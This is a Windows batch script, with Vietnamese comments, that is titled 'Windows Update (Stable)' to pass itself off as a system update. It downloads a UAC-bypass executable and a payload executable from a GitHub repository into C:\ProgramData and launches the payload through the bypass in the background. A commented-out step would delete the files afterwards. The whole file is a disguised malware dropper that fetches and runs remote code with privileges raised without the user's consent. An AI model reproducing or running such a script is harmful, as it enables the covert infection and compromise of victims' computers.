@echo off
title Windows Update (Stable)

:: 1. ĐẶT THƯ MỤC LÀM VIỆC CỐ ĐỊNH, AN TOÀN
set "WORK_DIR=C:\ProgramData\WindowsUpdate"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
cd /d "%WORK_DIR%"

echo [1] Checking and downloading files...

:: 2. TẢI UAC BYPASS (Có báo lỗi nếu thất bại)
if not exist "UACbypass.exe" (
    echo     Downloading UACbypass.exe...
    curl -L --fail -o "UACbypass.exe" "https://github.com/Nphuc1503/rbbrrr/raw/refs/heads/main/UACbypass.exe"
    if errorlevel 1 (
        echo [ERROR] Failed to download UACbypass.exe. Check your internet or URL.
        pause
        exit /b
    )
) else (
    echo     UACbypass.exe already exists.
)

:: 3. TẢI PAYLOAD (Có báo lỗi nếu thất bại)
if not exist "nphuczz.exe" (
    echo     Downloading nphuczz.exe...
    curl -L --fail -o "nphuczz.exe" "https://github.com/Nphuc1503/rbbrrr/raw/refs/heads/main/nphuczz.exe"
    if errorlevel 1 (
        echo [ERROR] Failed to download nphuczz.exe. Check your internet or URL.
        pause
        exit /b
    )
) else (
    echo     nphuczz.exe already exists.
)

:: 4. CHẠY UAC BYPASS - DÙNG ĐƯỜNG DẪN TUYỆT ĐỐI (QUAN TRỌNG)
echo [2] Running UAC bypass with payload...
echo     Command: "%WORK_DIR%\UACbypass.exe" "%WORK_DIR%\nphuczz.exe"

:: Đây là lệnh chạy. Nó giống hệt cách bạn đã test thành công.
start /b "" "%WORK_DIR%\UACbypass.exe" "%WORK_DIR%\nphuczz.exe"

:: (Tùy chọn) Chờ 3 giây để UAC bypass khởi động
timeout /t 3 /nobreak >nul

echo [3] UAC bypass task initiated. Cleaning up in 10 seconds...

:: 5. DỌN DẸP (VẪN GIỮ LẠI FILE, CHỈ XÓA CÁI NÀY NẾU MUỐN)
:: timeout /t 10 /nobreak >nul
:: del "UACbypass.exe" "nphuczz.exe"

exit